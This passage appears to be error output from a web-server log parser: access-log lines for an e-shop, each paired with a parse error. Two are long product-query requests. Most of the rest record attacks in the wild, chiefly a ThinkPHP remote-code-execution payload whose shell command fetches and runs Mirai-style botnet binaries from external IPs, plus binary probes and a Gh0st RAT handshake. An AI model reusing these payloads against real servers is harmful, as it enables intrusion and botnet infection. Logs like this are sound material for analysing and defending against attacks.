27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60828,%2060829,%2061106]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57679,%2058602,%2062570]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[987106,%20987121,%20992487,%201034825,%201043822,%201043964,%201050125,%201058377,%201059103,%201065069,%201069943,%201071346,%201077679,%201080951,%201081548,%201081592,%201085226,%201090300,%201090638,%201090765,%201090829,%201096423,%201098133,%201098263,%201098306,%201098365,%201098677,%201098896,%201098936,%201101429,%201103340,%201103766,%201124747,%201129667,%201138598,%201139716,%201151604,%201157578,%201173836,%201177646,%201177724,%201177802,%201177880,%201177958,%201184023,%201184100,%201184177,%201184254,%201185435,%201186836,%201188122,%201188190,%201188289,%201188356,%201188580,%201188646,%201188714,%201188779,%201188846,%201188910,%201188974,%201189040,%201189103,%201189168,%201189230,%201189294,%201189355,%201189418,%201189478,%201189540,%201189599,%201189660,%201189718,%201189776,%201189836,%201189893,%201189952,%201190008,%201190066,%201190121,%201190178,%201190234,%201190287,%201190605,%201190657,%201190710,%201190761,%201193820,%201194310,%201194382,%201195748,%201195816,%201197112,%201197190,%201199572,%201199677,%201201148,%201205466,%201205607,%201209126,%201212283,%201216427,%201217612,%201220301,%201227114,%201227566,%201227647,%201230545,%201230625,%201230705,%201231883,%201232726,%201235726,%201239597,%201244186,%201250215,%201253250,%201255769,%201258720,%201261082,%201269482,%201271604,%201281340,%201281957,%201281965,%201284378,%201284386,%201285873,%201297334,%201297427,%201297489,%201297577,%201300614,%201301456,%201305437,%201314325,%201319335,%201325872,%201336661,%201336680,%201337864,%201338817,%201354442,%201366685,%201367179,%201395027,%201395660,%201421565,%201432684,%201451797,%201470884,%201471379,%201496577,%201529070,%201539470,%201548769,%201556973,%201557020,%201566841,%201579049,%201592648,%201593169,%201593325,%201595980,%201597681,%201601112,%201601149,%201602202,%201610910,%201628256,%201645571,%201652851,%201664619,%201675378,%201688189,%201696659,%201697024,%201707067,%201709359,%201713472,%201728294,%201728702,%201735762,%201736761,%201736937,%201738206,%201738393,%201738396,%201738399,%201738403,%201742639,%201744324,%201744364,%201750336,%201750790,%201755206,%201763498,%201780188,%201786013,%201795468,%201797424,%201800533,%201800910,%201802304,%201802469,%201809758,%201821471,%201824569,%201824643,%201824852,%201824934,%201825015,%201825157,%201825619,%201825706,%201826386,%201826489,%201826591,%201826819,%201826922,%201827124,%201828346,%201829560,%201829784,%201829942,%201831483,%201831589,%201831694,%201831800,%201831905,%201832010,%201832116,%201832283,%201832663,%201832664,%201833024,%201833131,%201833132,%201833240,%201835488,%201836063,%201836231,%201836341,%201836493,%201837002,%201837175,%201837286,%201837287,%201837398,%201837399,%201837725,%201838724,%201842685,%201844939,%201849743,%201853086,%201853413,%201856027,%201857897,%201865492,%201873202,%201884294,%201897795,%201897832,%201899561,%201901452,%201907619,%201908878,%201908938,%201908998,%201909060,%201911987,%201912031,%201912955,%201915059,%201919815,%201930846,%201931495,%201931563,%201933015,%201937676,%201942542,%201953747,%201960558,%201960739,%201965157,%201031381,%201034826,%201043823,%201043965,%201050126,%201058378,%201059104,%201065070,%201069944,%201070655,%201071347,%201077680,%201080952,%201081549,%201081593,%201085227,%201090301,%201092161,%201092284,%201098366,%201101430,%201124748,%201129668,%201138599,%201139717,%201151605,%201157579,%201186837,%201191838,%201195750,%201195818,%201197113,%201197191,%201199573,%201199678,%201201149,%201205467,%201205608,%201209127,%201212284,%201216428,%201217613,%201220302,%201227115,%201227567,%201227648,%201230546,%201230626,%201230706,%201231884,%201232727,%201235727,%201239598,%201244187,%201250216,%201253251,%201255770,%201258721,%201261083,%201269483,%201271605,%201281958,%201281966,%201284379,%201284387,%201285874,%201286328,%201297335,%201297428,%201297490,%201297578,%201300615,%201301457,%201305438,%201314326,%201325873,%201334356,%201334493,%201334727,%201337865,%201340881,%201354443,%201366687,%201367181,%201395029,%201395662,%201421567,%201432686,%201451799,%201470886,%201471381,%201496579,%201529072,%201539472,%201548771,%201556975,%201557022,%201566843,%201579051,%201595982,%201597683,%201601114,%201601151,%201602204,%201610912,%201628258,%201645573,%201652853,%201664621,%201675380,%201688191,%201709363,%201713474,%201763500,%201780190,%201786017,%201797426,%201802306,%201809760,%201849745,%201853088,%201857899,%201865494,%201873204,%201884296,%201901454,%201907621,%201919817,%201931657,%201932158,%201955188,%201965159,%201282274,%201285875,%201297336,%201297429,%201297492,%201297579,%201300616,%201301458,%201305439,%201314327,%201336662,%201336706,%201337866,%201338818,%201350826,%201354444,%201366689,%201367183,%201395031,%201395664,%201421569,%201432688,%201451801,%201470888,%201471383,%201496581,%201529074,%201539474,%201548773,%201556977,%201557024,%201566845,%201579053,%201592650,%201593173,%201593329,%201595984,%201597685,%201601116,%201601153,%201602206,%201610914,%201628260,%201645575,%201652855,%201664623,%201675382,%201688193,%201709365,%201713476,%201744326,%201744366,%201746850,%201746867,%201746884,%201755658,%201759624,%201763502,%201780192,%201786019,%201802308,%201809762,%201821473,%201833376,%201838726,%201842687,%201844941,%201849747,%201853090,%201857901,%201866924,%201897797,%201897834,%201901603,%201901682,%201901762,%201901" 414 186 "-" "-" "-"\n', 'list index out of range')
('91.99.30.32 - - [22/Jan/2019:17:55:40 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:9103},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[23228,%2061448,%2061449,%2061450,%2061461]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[15503,%2015504]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[88510,%2090111,%2092944,%20121366,%20121446,%20124092,%20130052,%20257155,%20319972,%20320568,%20341312,%20347500,%20387843,%20413773,%20421310,%20421462,%20425250,%20445328,%20504509,%20504510,%20509896,%20513117,%20513613,%20516806,%20518672,%20529249,%20550946,%20553838,%20564459,%20564482,%20564505,%20568654,%20568686,%20568709,%20568733,%20568757,%20568785,%20568808,%20569422,%20569445,%20576760,%20590017,%20592895,%20616123,%20645832,%20727654,%20741325,%20774325,%20774540,%20775973,%20785148,%20790007,%20790050,%20790093,%20790136,%20790179,%20790222,%20790265,%20790308,%20790351,%20790394,%20790437,%20790480,%20790523,%20790566,%20803147,%20815335,%20817410,%20824261,%20824262,%20849125,%20849413,%20849455,%20849496,%20849536,%20849575,%20849613,%20849650,%20849686,%20849721,%20849755,%20849788,%20849820,%20896020,%20924813,%20952339,%20952367,%20952395,%20952423,%20952451,%20952479,%20965167,%20980115,%20989118,%20989125,%201019363,%201021710,%201023616,%201024837,%201024917,%201028277,%201045742,%201053292,%201058499,%201058603,%201072508,%201082755,%201082843,%201089360,%201095251,%201109859,%201133106,%201159321,%201159616,%201159689,%201163551,%201163624,%201163698,%201163771,%201163843,%201163913,%201166793,%201166862,%201166931,%201167143,%201185124,%201191706,%201204943,%201220745,%201229475,%201234154,%201239180,%201254328,%201310665,%201318685,%201318866,%201318869,%201319331,%201341077,%201342259,%201349733,%201375595,%201410807,%201422061,%201430180,%201436511,%201438435,%201439336,%201439484,%201442351,%201444123,%201459962,%201460279,%201472352,%201472670,%201476319,%201476348,%201476377,%201476407,%201476835,%201476888,%201476917,%201480938,%201487157,%201489097,%201495473,%201509217,%201512877,%201512886,%201512897,%201512911,%201512926,%201512943,%201512963,%201512985,%201513008,%201513034,%201513062,%201513090,%201513120,%201513149,%201513842,%201513874,%201520644,%201523425,%201524024,%201524051,%201524052,%201530700,%201530718,%201539844,%201545908,%201564704,%201564745,%201565899,%201570357,%201570418,%201574436,%201579448,%201589699,%201594691,%201596664,%201601882,%201620684,%201656976,%201688033,%201702050,%201713360,%201732681,%201743714,%201763346,%201779832,%201785697,%201800631,%201800670,%201817045,%201818196,%201818223,%201818250,%201818284,%201818315,%201818316,%201818348,%201818379,%201818410,%201818450,%201818482,%201818522,%201818554,%201818585,%201824077,%201835567,%201836727,%201836755,%201837933,%201837983,%201838803,%201848063,%201850593,%201851102,%201853977,%201854067,%201854991,%201855053,%201855170,%201856037,%201856625,%201856880,%201856962,%201856974,%201857003,%201857191,%201859427,%201859428,%201863619,%201868735,%201871516,%201871544,%201873427,%201873544,%201873606,%201875938,%201875999,%201876060,%201876121,%201876182,%201876455,%201877519,%201877581,%201877582,%201879447,%201880307,%201882561,%201882641,%201882649,%201882651,%201883595,%201889476,%201893353,%201894172,%201902553,%201903836,%201909254,%201921090,%201921163,%201921273,%201930633,%201944604,%201954313,%201968157,%201970363,%201970676,%201973196,%2088511,%20121367,%20121445,%20124093,%20130053,%20257156,%20301334,%20305696,%20319973,%20320569,%20347501,%20387844,%20413774,%20421311,%20421463,%20425251,%20445329,%20504511,%20504512,%20509897,%20513118,%20513614,%20516807,%20518673,%20529250,%20550947,%20553839,%20564460,%20564483,%20564506,%20568655,%20568687,%20568710,%20568734,%20568758,%20568786,%20568809,%20569423,%20569446,%20576761,%20590018,%20592896,%20616124,%20645833,%20727655,%20741326,%20774326,%20774541,%20775974,%20785149,%20790008,%20790051,%20790094,%20790137,%20790180,%20790223,%20790266,%20790309,%20790352,%20790395,%20790438,%20790481,%20790524,%20790567,%20803148,%20815336,%20817411,%20824263,%20824264,%20849126,%20849414,%20849456,%20849497,%20849537,%20849576,%20849614,%20849651,%20849687,%20849722,%20849756,%20849789,%20849821,%20896021,%20924814,%20952340,%20952368,%20952396,%20952424,%20952452,%20952480,%20965168,%20980116,%20989119,%20989126,%20989828,%20994026,%201021711,%201022006,%201024838,%201024918,%201045743,%201053293,%201058500,%201058604,%201072509,%201082756,%201082844,%201089361,%201095252,%201109860,%201133107,%201159322,%201159617,%201159690,%201163552,%201163625,%201163699,%201163772,%201163844,%201163914,%201166794,%201166863,%201166932,%201167144,%201185125,%201185184,%201191707,%201220746,%201229476,%201234155,%201239181,%201254329,%201310666,%201318686,%201341078,%201342260,%201349734,%201375597,%201410809,%201422063,%201430182,%201436513,%201438437,%201439338,%201439486,%201442353,%201444125,%201459964,%201460281,%201472354,%201472672,%201476321,%201476350,%201476379,%201476409,%201476837,%201476890,%201476919,%201480940,%201487159,%201489099,%201495475,%201509219,%201512879,%201512888,%201512899,%201512913,%201512928,%201512945,%201512965,%201512987,%201513010,%201513036,%201513064,%201513092,%201513122,%201513151,%201513844,%201513876,%201520646,%201523427,%201524026,%201524054,%201524055,%201524081,%201524107,%201524108,%201524134,%201524159,%201524160,%201524186,%201524211,%201524212,%201524238,%201524240,%201530702,%201530722,%201539846,%201545910,%201564706,%201564747,%201565901,%201570359,%201570420,%201574438,%201579450,%201589701,%201594693,%201596666,%201601884,%201620686,%201656978,%201688039,%201702052,%201713362,%201732683,%201743716,%201763348,%201" 414 186 "-" "-" "-"\n', 'list index out of range')
('64.62.197.65 - - [22/Jan/2019:18:04:50 +0330] "\\x00\\x85\\x07" 400 166 "-" "-" "-"\n', 'list index out of range')
('64.62.197.65 - - [22/Jan/2019:18:04:50 +0330] "\\x05bE\\x00\\x05b\\x00\\x00@\\x00;\\x11\\x0F\\xAC\\xD8:\\xC2\\xD6" 400 166 "-" "-" "-"\n', 'list index out of range')
('124.5.72.114 - - [22/Jan/2019:18:46:45 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.70.118 - - [22/Jan/2019:19:17:55 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('149.12.217.166 - - [22/Jan/2019:19:20:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('74.82.60.72 - - [22/Jan/2019:19:31:13 +0330] "E\\x00\\x00I\\xCD{\\x00\\x00@\\x11\\xF5Q" 400 166 "-" "-" "-"\n', 'list index out of range')
('42.112.163.67 - - [22/Jan/2019:20:31:15 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('85.59.177.246 - - [22/Jan/2019:20:52:36 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('64.68.245.69 - - [22/Jan/2019:20:58:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('178.47.102.135 - - [22/Jan/2019:21:52:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('5.188.210.12 - - [22/Jan/2019:23:05:04 +0330] "\\x05\\x01\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('5.188.210.12 - - [22/Jan/2019:23:06:22 +0330] "\\x04\\x01\\x00P\\x05\\xBC\\xD2\\x0C\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('74.93.73.169 - - [23/Jan/2019:00:29:50 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('65.127.187.7 - - [23/Jan/2019:00:36:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('103.2.64.231 - - [23/Jan/2019:00:59:05 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('182.170.139.97 - - [23/Jan/2019:01:01:53 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('120.28.151.44 - - [23/Jan/2019:01:58:17 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('66.240.205.34 - - [23/Jan/2019:03:09:34 +0330] "Gh0st\\xAD\\x00\\x00\\x00\\xE0\\x00\\x00\\x00x\\x9CKS``\\x98\\xC3\\xC0\\xC0\\xC0\\x06\\xC4\\x8C@\\xBCQ\\x96\\x81\\x81\\x09H\\x07\\xA7\\x16\\x95e&\\xA7*\\x04$&g+\\x182\\x94\\xF6\\xB000\\xAC\\xA8rc\\x00\\x01\\x11\\xA0\\x82\\x1F\\x5C`&\\x83\\xC7K7\\x86\\x19\\xE5n\\x0C9\\x95n\\x0C;\\x84\\x0F3\\xAC\\xE8sch\\xA8^\\xCF4\'J\\x97\\xA9\\x82\\xE30\\xC3\\x91h]&\\x90\\xF8\\xCE\\x97S\\xCBA4L?2=\\xE1\\xC4\\x92\\x86\\x0B@\\xF5`\\x0CT\\x1F\\xAE\\xAF]" 400 166 "-" "-" "-"\n', 'list index out of range')
('98.206.114.40 - - [23/Jan/2019:03:36:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('98.206.114.40 - - [23/Jan/2019:03:36:20 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('98.206.114.40 - - [23/Jan/2019:03:36:25 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('66.160.199.78 - - [23/Jan/2019:03:52:09 +0330] "E\\x00\\x00J\\x11,@\\x00@\\x11\\x7F\\xA1" 400 166 "-" "-" "-"\n', 'list index out of range')
('103.213.27.147 - - [23/Jan/2019:04:18:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('194.113.106.124 - - [23/Jan/2019:05:21:53 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('93.127.52.4 - - [23/Jan/2019:06:06:13 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.148.174.153 - - [23/Jan/2019:06:31:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('223.197.212.15 - - [23/Jan/2019:07:06:40 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('192.99.203.185 - - [23/Jan/2019:07:23:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86\' HTTP/1.1" 400 166 "-" "Damien/2.0" "-"\n', 'list index out of range')
('117.102.69.124 - - [23/Jan/2019:07:33:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('61.121.238.84 - - [23/Jan/2019:07:33:48 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('64.68.245.69 - - [23/Jan/2019:07:43:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('193.86.156.188 - - [23/Jan/2019:08:05:12 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('193.86.156.188 - - [23/Jan/2019:08:05:29 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('80.211.175.115 - - [23/Jan/2019:08:20:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('36.66.16.117 - - [23/Jan/2019:08:20:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('120.224.101.134 - - [23/Jan/2019:09:24:38 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('196.46.202.80 - - [23/Jan/2019:09:27:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
